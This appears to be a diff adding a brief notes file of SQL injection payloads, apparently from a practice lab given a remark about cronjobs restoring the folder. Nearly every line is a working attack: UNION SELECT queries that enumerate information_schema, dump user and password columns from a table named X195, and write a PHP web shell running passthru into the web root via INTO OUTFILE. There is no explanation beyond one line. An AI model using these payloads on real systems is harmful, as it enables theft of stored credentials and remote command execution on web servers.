@@ -1,0 +1,15 @@
+d'unioN sElect version(),user() FROM information_schema.tables
+d'unioN SELeCT database(),table_name FROM information_schema.tables where table_schema=database()#
+d'unioN seleCt column_name,database() from information_schema.columns where table_name="X195"#
+d'Union Select user,pass from X195#
+
+select user,pass from X195 where user='
+1' union select '<?php passthru("ls -a"); ?>',null into outfile "/var/www/html/myshell.php"#
+' and pass='s'
+
+
+
+cronjobs should remove the whole folder and copy the original files again
+
+
+select user,pass from X195 where user='1' union select '<?php passthru("ls -a"); ?>',null into outfile "/var/www/html/sqli/myshell.php"#' and pass='s'
